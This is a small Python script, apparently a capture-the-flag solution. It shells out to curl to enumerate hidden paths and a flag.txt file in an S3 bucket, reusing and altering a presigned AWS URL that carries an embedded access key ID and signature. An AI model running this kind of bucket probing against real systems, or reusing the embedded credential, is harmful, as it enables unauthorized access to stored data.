import os, time

#times = [1600286003, 1600286004, 1600286003+3600*4, 1600286003+3600*7, 1600286004+3600*4, 1600286004+3600*7]
folds = ["", ".sorry", ".sorry/.for", ".sorry/.for/.nothing", ".sorry/", ".sorry/.for/", ".sorry/.for/.nothing/"]
folds2 = []

for i in folds:
	if len(i)==0 or i[-1] == '/':
		folds2.append(i + 'flag.txt')

folds += folds2

for fold in folds:
	for pend in ["%2F20200909%2Fus-east-2%2Fs3%2Faws4_request&X-Amz-Date=20200909T195323Z&X-Amz-Expires=604800", "%2F20200910%2Fus-east-2%2Fs3%2Faws4_request&X-Amz-Date=20200910T005323Z&X-Amz-Expires=604800"]:
		os.system("curl -k 'https://super-top-secret-dont-look.s3.us-east-2.amazonaws.com/%s?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAQHTF3NZUTQBCUQCK%s&X-Amz-SignedHeaders=host&X-Amz-Signature=3560cef4b02815e7c5f95f1351c1146c8eeeb7ae0aff0adc5c106f6488db5b6b'" % (fold, pend))
